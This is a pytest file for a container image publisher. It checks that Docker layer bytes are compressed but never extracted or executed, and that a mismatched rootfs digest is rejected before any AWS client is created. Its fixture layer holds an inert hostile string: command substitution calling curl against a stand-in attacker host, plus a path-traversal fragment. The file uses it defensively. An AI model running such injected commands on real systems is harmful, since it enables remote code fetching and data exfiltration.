"""Layer bytes remain data; mismatched rootfs/descriptors fail before credentials."""

import gzip
import hashlib
import io
import tarfile
from unittest.mock import Mock

import pytest

from adapters.aws.data_image_publisher import EcrDataPublisher
from adapters.build.registry_image import registry_image
from ports.remote_builds import canonical


def fixture_archive(path, *, wrong_diff=False):
    layer = b"not executed: $(curl attacker.invalid); ../../host; private-canary"
    layer_digest = "sha256:" + hashlib.sha256(layer).hexdigest()
    config = canonical(
        {
            "os": "linux",
            "architecture": "amd64",
            "rootfs": {"type": "layers", "diff_ids": ["sha256:" + "0" * 64 if wrong_diff else layer_digest]},
        }
    )
    config_digest = hashlib.sha256(config).hexdigest()
    entries = {
        config_digest + ".json": config,
        "layer/layer.tar": layer,
        "manifest.json": canonical(
            [
                {
                    "Config": config_digest + ".json",
                    "Layers": ["layer/layer.tar"],
                    "RepoTags": ["sky-build:test"],
                }
            ]
        ),
    }
    with tarfile.open(path, "w", format=tarfile.USTAR_FORMAT) as output:
        for name, body in entries.items():
            member = tarfile.TarInfo(name)
            member.size = len(body)
            output.addfile(member, io.BytesIO(body))
    return "sha256:" + config_digest, layer


def test_classic_docker_layer_is_deterministically_compressed_never_extracted(tmp_path):
    path = tmp_path / "image.tar"
    identity, layer = fixture_archive(path)
    manifests = []
    for _ in range(2):
        with registry_image(path, identity, "sky-build:test") as result:
            manifests.append(result["manifest"])
            import json

            manifest = json.loads(result["manifest"])
            blob = result["blobs"][manifest["layers"][0]["digest"]]
            assert gzip.decompress(blob.read_bytes()) == layer
            assert result["code_executed"] is False
    assert manifests[0] == manifests[1]
    assert list(tmp_path.iterdir()) == [path]


def test_mismatched_rootfs_rejected_before_any_aws_client(tmp_path):
    path = tmp_path / "image.tar"
    identity, _ = fixture_archive(path, wrong_diff=True)
    session = Mock()
    publisher = EcrDataPublisher(
        account_id="123456789012",
        region="ap-northeast-2",
        repository="sky-test",
        session=session,
        guard=Mock(),
    )
    with pytest.raises(ValueError, match="differs"):
        publisher.publish(
            path,
            image_id=identity,
            local_tag="sky-build:test",
            tag="build-00000000-0000-4000-8000-000000000001",
        )
    session.client.assert_not_called()
